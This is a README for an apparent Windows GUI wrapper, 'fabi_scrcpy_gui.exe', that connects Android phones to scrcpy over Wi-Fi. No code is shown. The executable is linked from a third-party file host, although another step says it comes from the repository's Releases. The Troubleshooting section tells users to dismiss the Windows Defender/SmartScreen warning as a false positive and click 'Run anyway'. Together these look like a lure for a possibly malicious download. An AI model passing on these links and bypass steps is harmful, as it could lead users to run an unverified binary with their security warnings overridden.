# Auto Wireless Scrcpy Connector (Windows Edition)
**Developed By: fabiTECH**

A smart and automated GUI tool to easily connect your Android device to your PC via Wi-Fi using `scrcpy`. Forget about manually typing IP addresses or running CMD commands. 

**🎉 No Python installation required! Just download and run the executable.**

---

## ✨ Features
* **Standalone Executable:** Runs directly on Windows (No need to install Python or PySide6).
* **Automated IP Detection:** Automatically finds your phone's Wi-Fi IP address.
* **One-Click Wireless Connection:** Seamlessly switches your adb connection from USB to TCP/IP.
* **Sleek GUI:** A beautiful, dark-themed hacker-style interface.
* **Real-time Logs:** See exactly what is happening in the background through the log console.

---

## 📥 Download & Installation

1. **Download Scrcpy and fabi_scrcpy_gui:** Download the official Windows version from the link below:
 *  👉 [fabi_scrcpy_gui.exe](https://new9.oxxfile.info/s/i9cUVnPD45)
 * 👉 [Download scrcpy-win64-v3.3.4.zip](https://github.com/Genymobile/scrcpy/releases/download/v3.3.4/scrcpy-win64-v3.3.4.zip)

3. **Extract the Files:**
   Extract the downloaded `.zip` file into a folder on your PC.

4. **Download the App:**
   Download the `fabi_scrcpy_gui.exe` file from the Releases section of this repository.

5. **Place the Executable:**
   Move the `fabi_scrcpy_gui.exe` file **directly inside** the extracted `scrcpy` folder. 
   *(Crucial: It must be in the exact same folder as `scrcpy.exe` and `adb.exe`)*

---

## 🚀 How to Connect

Follow these simple steps to mirror your phone wirelessly:

* **Step 1:** Enable **USB Debugging** from the Developer Options on your Android phone.
* **Step 2:** Connect your phone and your PC to the same Wi-Fi network.
* **Step 3:** Connect your phone to the PC using a USB Cable (This is only required for the initial handshake).
    * *Note: If a prompt appears on your phone asking to "Allow USB debugging", tap **OK/Allow**.*
* **Step 4:** Double-click on `fabi_scrcpy_gui.exe` to run the application.
* **Step 5:** Click the **"Connect & Start Scrcpy"** button.
* **Step 6:** Wait for the success message in the log box. Once connected, **you can disconnect the USB cable!** `scrcpy` will launch automatically over Wi-Fi.

---

## ⚠️ Troubleshooting & Notes

* **SmartScreen / Windows Defender Warning:** Since this is a newly created `.exe` file, Windows Defender might show a "Windows protected your PC" warning. This is a false positive. Just click on **"More info"** and then **"Run anyway"**.
* **"adb.exe not found":** Make sure you placed `fabi_scrcpy_gui.exe` in the exact same folder as the extracted `scrcpy` files.
* **"IP not found" error:** Ensure your phone is not asleep and is properly connected to the Wi-Fi.
* **Connection Timeout:** Turn your phone's Wi-Fi off and on again, then retry.

---
*Created with ❤️ by **fabiTECH***
